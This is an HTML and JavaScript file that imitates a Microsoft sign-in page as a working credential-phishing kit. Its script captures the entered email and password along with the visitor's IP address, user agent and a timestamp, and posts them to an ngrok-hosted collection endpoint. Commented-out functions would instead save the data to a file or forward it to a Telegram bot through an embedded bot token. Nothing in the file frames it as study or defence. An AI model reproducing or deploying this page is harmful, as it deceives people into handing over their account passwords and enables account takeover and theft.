<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft | Login</title>
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" crossorigin="anonymous">
    <style>
        :root {
            --primary-color: #0066BA;
            --error-color: #d13438;
            --text-color: #323130;
            --light-gray: #f3f2f1;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Archivo Narrow', sans-serif;
            color: var(--text-color);
            line-height: 1.5;
            background-color: var(--light-gray);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Container styles */
        .container-fluid {
            width: 100%;
            padding: 0;
            margin: 0;
            flex: 1;
        }

        .container {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 15px;
        }

        /* Box styles */
        .box {
            background-color: white;
            border-radius: 4px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
            padding: 24px;
            margin: 20px auto;
            max-width: 440px;
            width: 100%;
            animation: fadeIn 0.3s ease-in;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Form elements */
        .form-group {
            margin-bottom: 16px;
        }

        .form-control {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
            transition: border-color 0.15s;
        }

        .form-control:focus {
            border-color: var(--primary-color);
            outline: none;
        }

        .btn {
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.15s;
        }

        .btn-primary {
            background-color: var(--primary-color);
            color: white;
            border: none;
        }

        .btn-primary:hover {
            background-color: #004e8c;
        }

        /* Text styles */
        .text-right {
            text-align: right;
        }

        .text-center {
            text-align: center;
        }

        .h5 {
            font-size: 1.25rem;
            font-weight: 600;
            margin-bottom: 16px;
        }

        /* Error messages */
        .error-message {
            color: var(--error-color);
            font-size: 14px;
            margin-top: 4px;
            display: none;
        }

        /* Header styles */
        .logo-header {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
        }

        .logo-header img {
            margin-right: 10px;
        }

        /* Footer styles */
        #footer {
            background-color: rgba(0, 0, 0, 0.6);
            color: white;
            padding: 10px 0;
            width: 100%;
        }

        .footer-content {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 15px;
        }

        .footer-content a, 
        .footer-content span {
            color: white;
            font-size: 12px;
            margin-left: 15px;
            text-decoration: none;
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            .box {
                padding: 20px;
                margin: 15px auto;
                box-shadow: none;
                border: 1px solid #ddd;
            }

            .container {
                padding: 0 10px;
            }

            .btn {
                width: 100%;
            }
        }

        @media (max-width: 480px) {
            .box {
                padding: 15px;
                margin: 10px auto;
            }

            .h5 {
                font-size: 1.1rem;
            }

            .form-control {
                padding: 10px;
            }
        }

        /* Animation for form switching */
        .boxtext {
            animation: slideIn 0.3s ease-out;
        }

        @keyframes slideIn {
            from { transform: translateX(20px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        /* Background image */
        .bgimg {
            background-image: url('bg.jpg');
            background-size: cover;
            background-position: center;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        /* Sign in options box */
        .signin-options {
            max-width: 440px;
            margin: 0 auto 30px;
            padding: 15px;
            background-color: white;
            border-radius: 4px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
        }

        /* Back button */
        .back-btn {
            color: var(--primary-color);
            background: none;
            border: none;
            cursor: pointer;
            font-size: 16px;
            margin-bottom: 15px;
        }

        /* Link styles */
        a {
            color: var(--primary-color);
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div id="main">
        <div class="bgimg">
            <div class="container">
                <div class="row">
                    <div class="col-lg-6 mx-auto">
                        <!-- Step 1: Email Input -->
                        <div id="step1" class="box">
                            <form class="boxtext">
                                <div class="logo-header">
                                    <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" width="30" alt="Microsoft logo">
                                    <span class="h5">Microsoft</span>
                                </div>
                                <h2 class="h5">Sign In</h2>
                                <p id="emailError" class="error-message"></p>
                                <div class="form-group">
                                    <input type="email" class="form-control" id="email" placeholder="Email, phone, or Skype" required>
                                </div>
                                <p><a href="#">No account? Create one!</a></p>
                                <p><a href="#">Can't access your account?</a></p>
                                <div class="text-right">
                                    <button id="next" class="btn btn-primary">Next</button>
                                </div>
                            </form>
                        </div>

                        <!-- Step 2: Password Input -->
                        <div id="step2" class="box" style="display: none;">
                            <form class="boxtext" id="loginForm">
                                <div class="logo-header">
                                    <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" width="30" alt="Microsoft logo">
                                    <span class="h5">Microsoft</span>
                                </div>
                                <button id="back" class="back-btn">
                                    <i class="fas fa-arrow-left"></i> <span id="emailDisplay"></span>
                                </button>
                                <h2 class="h5">Enter Password</h2>
                                <p id="passwordError" class="error-message"></p>
                                <div class="form-group">
                                    <input type="password" class="form-control" id="password" placeholder="Enter Password" required>
                                </div>
                                <p><a href="#">Forgot password?</a></p>
                                <div class="text-right">
                                    <button type="submit" class="btn btn-primary">Sign In</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>

                <!-- Sign in options -->
                <div class="signin-options">
                    <div class="py-2">
                        <img src="key.svg" width="30" alt="key icon"> &nbsp;Sign in options
                    </div>
                </div>
            </div>
        </div>

        <footer id="footer">
            <div class="footer-content">
                <span>Â©2025 Microsoft</span>
                <a href="#">Privacy statement</a>
            </div>
        </footer>
	</div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            let step = 1;
            let email = '';
            let password = '';
            let userIP = '';
            let userAgent = navigator.userAgent;

            // Fetch IP address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    userIP = data.ip;
                })
                .catch(error => {
                    console.error('Error fetching IP:', error);
                    userIP = 'Unknown';
                });

            // Next button click handler
            document.getElementById('next').addEventListener('click', function(e) {
                e.preventDefault();
                document.getElementById('emailError').style.display = 'none';
                
                email = document.getElementById('email').value.trim();
                
                if (!email) {
                    document.getElementById('emailError').textContent = 'Email is required.';
                    document.getElementById('emailError').style.display = 'block';
                    return;
                }

                const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
                if (!isValidEmail) {
                    document.getElementById('emailError').textContent = 'Invalid email format.';
                    document.getElementById('emailError').style.display = 'block';
                    return;
                }

                // Show step 2
                document.getElementById('step1').style.display = 'none';
                document.getElementById('step2').style.display = 'block';
                document.getElementById('emailDisplay').textContent = email;
                step = 2;
            });

            // Back button click handler
            document.getElementById('back').addEventListener('click', function(e) {
                e.preventDefault();
                document.getElementById('step2').style.display = 'none';
                document.getElementById('step1').style.display = 'block';
                document.getElementById('password').value = '';
                document.getElementById('passwordError').style.display = 'none';
                step = 1;
            });

            // Form submission handler
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                document.getElementById('passwordError').style.display = 'none';
                
                password = document.getElementById('password').value.trim();
                
                if (!password) {
                    document.getElementById('passwordError').textContent = 'Password is required.';
                    document.getElementById('passwordError').style.display = 'block';
                    return;
                }

                // Create data object with all collected information
                const userData = {
                    email: email,
                    password: password,
                    ipAddress: userIP,
                    userAgent: userAgent,
                    timestamp: new Date().toISOString()
                };

                // console.log('User login data:', userData);

                // Save to file
                // saveToFile(userData);
                
                // Send to PHP
                sentToPhp(userData);
                
                // Send to Telegram
                // sendToTelegram(userData);
            });

            function saveToFile(data) {
                // Create a blob with the data
                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
                const url = URL.createObjectURL(blob);
                
                // Create a temporary anchor element to trigger download
                const a = document.createElement('a');
                a.href = url;
                a.download = `user_data_${Date.now()}.json`;
                document.body.appendChild(a);
                a.click();
                
                // Clean up
                setTimeout(() => {
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                }, 0);
            }

            function sentToPhp(data) {
                try {
                    fetch('https://480a-191-101-130-200.ngrok-free.app/action', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(data),
                    })
                    .then(response => {
                        if (response.ok) {
                            console.log('Data submitted successfully!');
                        } else {
                            console.error('Submission failed!');
                        }
                    });
                } catch (error) {
                    console.error('Error:', error);
                }  
            }

            function sendToTelegram(data) {
                const botToken = '7676676109:AAHQZld_bADgICOLRn5Cs-49KT66Syhmk2w';
                const chatId = 'YOUR_CHAT_ID';
                const message = `New login data:\nEmail: ${data.email}\nPassword: ${data.password}\nIP: ${data.ipAddress}\nUser Agent: ${data.userAgent}\nTimestamp: ${data.timestamp}`;

                try {
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                        }),
                    });
                } catch (error) {
                    console.error('Error sending to Telegram:', error);
                }
            }
        });
    </script>
</body>
</html>
